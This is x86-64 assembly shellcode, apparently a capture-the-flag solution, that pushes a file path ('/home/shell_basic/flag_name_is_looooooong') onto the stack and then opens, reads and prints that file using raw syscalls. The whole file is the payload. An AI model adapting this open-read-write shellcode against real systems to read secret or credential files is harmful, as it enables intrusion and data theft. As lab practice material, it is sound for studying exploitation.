section .text
global _start
_start:
    ; Push and Open
    mov rax, 0x676E6F6F6F6F6F6F 
    push rax
    mov rax, 0x6C5F73695F656D61 
    push rax
    mov rax, 0x6E5F67616C662F63 
    push rax
    mov rax, 0x697361625f6c6c65 
    push rax
    mov rax, 0x68732f656d6f682f 
    push rax
    mov rdi, rsp     
    xor rsi, rsi    
    xor rdx, rdx    
    mov rax, 2      
    syscall         

    ; Read, len 
    mov rdi, rax      
    mov rsi, rsp
    sub rsi, 0x30     
    mov rdx, 0x30     
    mov rax, 0x0      
    syscall           

    ; Write
    mov rdi, 1        
    mov rax, 0x1      
    syscall           

    ; Exit
    mov rax, 0x3C     
    mov rdi, 0        
    syscall           